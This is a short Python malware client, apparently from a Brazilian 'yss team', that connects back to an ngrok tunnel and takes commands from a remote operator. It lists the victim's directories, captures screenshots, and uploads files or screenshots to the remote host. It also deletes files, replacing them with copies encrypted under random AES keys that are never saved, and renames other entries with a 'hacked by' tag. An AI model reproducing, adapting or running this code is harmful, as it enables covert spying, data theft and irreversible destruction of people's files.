# HOST="1.tcp.ngrok.io" PORT=12345 python client.py

import os
import socket
from random import randint
from os import chdir, getcwd, listdir
from os.path import isfile
import pyaes
import pyautogui
print("Rajada melhorada, deixe o termux rodando e vai rajar")
host = '0.tcp.sa.ngrok.io'
port = 19018

# Create a TCP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


chdir('..')
# Connect to the server with the socket via our ngrok tunnel
server_address = (host, port)
sock.connect(server_address)

message = 'bixaXXXXXXXXXXX'
data_received = 0
data_expected = len(message)

while data_received < data_expected:
    data = sock.recv(1024)
    data_received += len(data)
    # print("Received: {}".format(data.decode("utf-8")))
    for c in listdir():
        if data.decode("utf-8") == 'x':
            sock.send(f'{c}  \n '.encode())

        elif data.decode("utf-8") == 'cd':
            chdir('..')
            sock.send('Feito!'.encode('utf-8'))
        elif data.decode("utf-8") == 'print':
            prnt = pyautogui.screenshot()
            name = f'print{randint(10000, 99999999)}.png'
            prnt.save(name)
            t = open(name, 'rb')
            msm = t.read()
            sock.send(msm)
            break

        elif data.decode("utf-8") == 'encrypt':
            if isfile(c):
                p = c
                filename = p
                file = open(filename, 'rb')
                file_data = file.read()
                file.close()

                os.remove(filename)
                key = f"{randint(1000000000000000, 9000000000000000)}".encode()
                aes = pyaes.AESModeOfOperationCTR(key)
                crypto_data = aes.encrypt(file_data)

                nw = filename + '.yss'
                file = open(nw, 'w')
                file_data = file.write(str(crypto_data))
                file.close()
                sock.send('Feito!'.encode('utf-8'))
            else:
                os.rename(c, f'hacked by yss team - M7coder - {randint(232323232323, 23232323232323232)}')


        else:
            t = open(data.decode("utf-8"), 'rb')
            msm = t.read()

            sock.send(msm)


# sock.close()

# Send the message
# Await a response

sock.close()
